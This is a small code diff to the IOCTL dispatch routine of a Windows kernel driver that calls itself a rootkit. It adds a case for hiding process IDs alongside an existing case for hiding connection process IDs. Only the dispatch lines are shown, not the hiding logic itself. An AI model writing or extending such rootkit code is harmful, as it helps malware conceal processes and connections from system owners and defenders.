@@ -109,7 +109,12 @@ NTSTATUS NetRootkitDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case RookitIoctls::HideConnectProcessId:
 
-		status = IoctlHandlers::HandleConnectPID(Irp, IrpStack->Parameters.DeviceIoControl.InputBufferLength);
+		status = IoctlHandlers::HandleHideConnectPID(Irp, IrpStack->Parameters.DeviceIoControl.InputBufferLength);
+		break;
+
+	case RookitIoctls::HideProcessId:
+
+		status = IoctlHandlers::HandleHidePID(Irp, IrpStack->Parameters.DeviceIoControl.InputBufferLength);
 		break;
 
 	default:
